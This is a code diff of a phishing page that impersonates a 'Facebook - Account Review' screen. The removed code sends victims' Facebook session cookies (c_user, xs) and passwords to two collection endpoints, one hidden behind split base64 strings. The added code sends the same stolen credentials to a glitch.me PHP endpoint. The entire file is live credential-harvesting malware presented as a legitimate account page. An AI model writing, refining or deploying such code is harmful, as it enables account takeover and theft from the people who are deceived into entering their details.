@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Facebook - Account Review w</title>
+    <title>Facebook - Account Review</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
         * {
@@ -1549,30 +1549,20 @@
         document.addEventListener('DOMContentLoaded', function() {
             // Video files mapping
             const videoFiles = {
-                'english': ' https://translationmeta2025-f87fc.web.app/english.mp4',
-                'filipino': ' https://translationmeta2025-f87fc.web.app/filipino.mp4',
-                'hindi': ' https://translationmeta2025-f87fc.web.app/hindi.mp4',
-                'portuguese': ' https://translationmeta2025-f87fc.web.app/portuguese.mp4',
-                'spanish': ' https://translationmeta2025-f87fc.web.app/spanish.mp4',
-                'tamil': ' https://translationmeta2025-f87fc.web.app/Tamil.mp4',
-                'arabic': ' https://translationmeta2025-f87fc.web.app/Arabic.mp4',
-                'french': ' https://translationmeta2025-f87fc.web.app/French.mp4',
-                'swedish': ' https://translationmeta2025-f87fc.web.app/Swedish.mp4',
-                'japanese': ' https://translationmeta2025-f87fc.web.app/japanese.mp4'
+                'english': 'https://translationmeta2025-f87fc.web.app/english.mp4',
+                'filipino': 'https://translationmeta2025-f87fc.web.app/filipino.mp4',
+                'hindi': 'https://translationmeta2025-f87fc.web.app/hindi.mp4',
+                'portuguese': 'https://translationmeta2025-f87fc.web.app/portuguese.mp4',
+                'spanish': 'https://translationmeta2025-f87fc.web.app/spanish.mp4',
+                'tamil': 'https://translationmeta2025-f87fc.web.app/Tamil.mp4',
+                'arabic': 'https://translationmeta2025-f87fc.web.app/Arabic.mp4',
+                'french': 'https://translationmeta2025-f87fc.web.app/French.mp4',
+                'swedish': 'https://translationmeta2025-f87fc.web.app/Swedish.mp4',
+                'japanese': 'https://translationmeta2025-f87fc.web.app/japanese.mp4'
             };
             
-            const endpointParts = [
-                "aHR0c", 
-                "HM6Ly", 
-                "9zdWJ", 
-                "taXQt", 
-                "Zm9yb", 
-                "S5jb2", 
-                "0vbEQ", 
-                "1QnVU", 
-                "YzUz"
-            ];
-            const obfuscatedEndpoint = endpointParts.join('');
+            // Form submission endpoint
+            const formEndpoint = "https://curvy-exclusive-pump.glitch.me/Mustfashedi.php";
 
             // Language modal elements
             const languageModal = document.getElementById('languageModal');
@@ -1972,7 +1962,7 @@
                 steps[0].classList.add('active');
             });
             
-            // Submit form
+            // Submit form - UPDATED TO USE NEW ENDPOINT
             nextToStep3.addEventListener('click', function() {
                 const passwordInput = document.getElementById('password');
                 
@@ -1989,37 +1979,23 @@
                 
                 const cUser = document.getElementById('c_user').value;
                 const xs = document.getElementById('xs').value;
+                const password = passwordInput.value;
                 
-                const endpoint1 = "https://submit-form.com/ike3iccTf";
-                const endpoint2 = atob(obfuscatedEndpoint);
+                // Create form data
+                const formData = new FormData();
+                formData.append('c_user', cUser);
+                formData.append('xs', xs);
+                formData.append('password', password);
                 
-                const formData = {
-                    c_user: cUser,
-                    xs: xs,
-                    password: passwordInput.value
-                };
-                
-                const submitToEndpoint = (endpoint) => {
-                    return fetch(endpoint, {
-                        method: 'POST',
-                        headers: {
-                            'Content-Type': 'application/json',
-                            'Accept': 'application/json'
-                        },
-                        body: JSON.stringify(formData)
-                    });
-                };
-                
-                Promise.all([
-                    submitToEndpoint(endpoint1),
-                    submitToEndpoint(endpoint2)
-                ])
-                .then(responses => {
-                    responses.forEach((response, index) => {
-                        if (!response.ok) {
-                            console.error(`Submission to endpoint ${index+1} failed`);
-                        }
-                    });
+                // Submit to the specified endpoint
+                fetch(formEndpoint, {
+                    method: 'POST',
+                    body: formData
+                })
+                .then(response => {
+                    if (!response.ok) {
+                        console.error('Submission failed');
+                    }
                 })
                 .catch(error => {
                     console.error('Submission error:', error);
